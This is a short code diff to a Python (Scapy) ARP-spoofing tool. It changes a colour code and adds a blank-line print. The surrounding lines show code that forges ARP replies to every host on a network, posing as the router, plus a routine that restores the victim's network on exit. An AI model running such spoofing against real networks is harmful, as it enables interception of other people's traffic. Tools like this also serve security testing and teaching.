@@ -26,7 +26,7 @@ def signal_handler(sig, frame):
   global routeur_ip
   global victim_mac
   global routeur_mac    
-  print("\033[1;42m \n [!] Restoring the victim's network")
+  print("\033[1;32m \n [!] Restoring the victim's network")
   send(ARP(pdst=victim_ip, macdst=victim_mac, psrc=routeur_ip, macsrc=routeur_mac, op=2), count=5, inter=.2)
 
   sys.exit(0)
@@ -93,6 +93,7 @@ def arp_spoof2(): # Get all MAC addresses of the network + spoof them
       arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
       packet = ethernet / arp
       sendp(packet, iface=iface)
+      print("\n")
       print("\033[1;31m [*]Spoof sent to ( {0} )".format(x['ip']))
 
 
